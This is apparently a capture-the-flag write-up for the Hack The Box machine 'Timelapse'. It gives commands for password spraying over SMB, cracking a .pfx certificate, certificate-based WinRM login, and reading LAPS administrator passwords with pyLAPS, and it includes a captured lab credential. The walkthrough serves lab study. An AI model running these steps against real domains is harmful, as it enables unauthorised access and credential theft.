---
date: 2026-04-29
tags:
  - htb
  - easy
  - AD
  - pfx
  - ReadLAPSPassword
  - smb
---


# Recon


TCP scan : 

<img width="939" height="776" alt="image" src="https://github.com/user-attachments/assets/3e29d6cc-3d10-4dfe-a610-ec1670c35f7d" />







# Exploit


## Port 139 / 445 smb

I can get a list of users on the domain with this command : `nxc smb 10.129.227.113 -u guest -p '' --rid-brute`


<img width="990" height="768" alt="image" src="https://github.com/user-attachments/assets/8a7d0429-3280-4ac4-8d98-e7339224b804" />


I'll extract the users from that output and put them in a users list.

## AS-REP

I tried AS-REP roast but it didn't work.

<img width="963" height="330" alt="image" src="https://github.com/user-attachments/assets/820c1eaa-618c-4e71-8b7c-c21b7c3af7a6" />





## user list spray


Because I couldn't find any other entry points, I spray the user list with the user list as the password list

`nxc smb 10.129.227.113 -u users.txt -p users.txt --continue-on-success`

I got a few results : 

<img width="927" height="678" alt="image" src="https://github.com/user-attachments/assets/66b44eff-d63a-4698-b6d4-f1798057c367" />




## share `shares`

I am able to log in and access the share `Shares`

<img width="785" height="199" alt="image" src="https://github.com/user-attachments/assets/26200e83-97de-476c-8db5-ce547ecd2a8b" />


I find this file in the Dev folder but I can't extract it without a password.

<img width="423" height="172" alt="image" src="https://github.com/user-attachments/assets/7241de18-0388-4e02-82dd-72d785d46194" />



I use fcrackzip to crack the password and the extracted folder gives a .pfx file.

<img width="874" height="171" alt="image" src="https://github.com/user-attachments/assets/924406d1-00cc-49ec-a306-c7ac692f8706" />


<img width="619" height="168" alt="image" src="https://github.com/user-attachments/assets/b3a00617-a062-45b7-89bb-ceee66f392cf" />




## Crack .pfx



With the  .pfx, we can 
```
pfx2john.py legacyy_dev_auth.pfx | tee legacyy_dev_auth.pfx.hash
```

crack lw hash to get the password
```
john --wordlist=/usr/share/wordlists/rockyou.txt legacyy_dev_auth.pfx.hash
```

extract key and certificate
```
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy_dev_auth.key-enc
Enter Import Password:
Enter PEM pass phrase: #on peut mettre nimporte quoi, faut 4 caractere
```

extract the rsa key
```
openssl rsa -in legacyy_dev_auth.key-enc -out legacyy_dev_auth.key
```

extract le certificate
```
 openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacyy_dev_auth.crt
```

use the key and certificate to connect
```
evil-winrm -i timelapse.htb -S -k legacyy_dev_auth.key -c legacyy_dev_auth.crt
```

<img width="863" height="128" alt="image" src="https://github.com/user-attachments/assets/a706344a-c6ce-4e0c-b57f-8adabc1a85e2" />




## legacyy

I can connect like so : 
`evil-winrm -i timelapse.htb -S -k legacyy_dev_auth.key -c legacyy_dev_auth.crt`


<img width="912" height="543" alt="image" src="https://github.com/user-attachments/assets/35833dc1-2d5e-4b91-9368-b5fb4a4bf122" />







# PrivEsc


## sharphound

I used SharpHound to get the required files to use in BloodHound.

<img width="1130" height="581" alt="image" src="https://github.com/user-attachments/assets/4bddfece-a7cb-4a14-818f-1afc7e49be17" />

<img width="1099" height="312" alt="image" src="https://github.com/user-attachments/assets/b933698e-2204-414c-8d28-2431150a546e" />



tried to do `CanPSRemote` but it didn't work.


With a hint, I searched the history file and was able to read the password of svc_deploy.

<img width="1133" height="278" alt="image" src="https://github.com/user-attachments/assets/544c4e6a-7c12-4420-8ab7-c48c905088e5" />



<img width="780" height="214" alt="image" src="https://github.com/user-attachments/assets/e71894e1-5cd0-4033-981f-ec21b195355a" />



Issue with WinRM. It just hangs.


<img width="1095" height="289" alt="image" src="https://github.com/user-attachments/assets/2d77228d-0fd8-4584-8c2f-5fbcd2c298af" />



I had to enable SSL for evil-winrm.

<img width="933" height="379" alt="image" src="https://github.com/user-attachments/assets/0c6ccdb7-0683-423f-9a48-9d7620f43821" />



I can privesc by exploiting the fact that the user is part of LAPS_Readers. LAPS is a solution that generates a unique password for local admins. Because we're part of that group, we are able to read it.

<img width="814" height="540" alt="image" src="https://github.com/user-attachments/assets/a57d345b-8809-4a0b-8b7b-a44939e8261d" />




## pyLAPS

We can read the password in the terminal with svc_deploy using this command : `Get-ADComputer DC01 -property 'ms-mcs-admpwd'`


I'll also try with this tool called pyLAPS : 
`python pyLAPS.py -a get -d 'timelapse.htb' -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV'`

<img width="974" height="332" alt="image" src="https://github.com/user-attachments/assets/6bb7c44b-9489-471b-857b-820029066277" />




## Adminsitrator


With the admin  password, i can connect to it and access the root file.

<img width="905" height="269" alt="image" src="https://github.com/user-attachments/assets/fb7aa799-1b40-4c89-9545-e25e620a3b57" />

<img width="495" height="523" alt="image" src="https://github.com/user-attachments/assets/78b50a83-b780-4271-8142-568ad2032b88" />





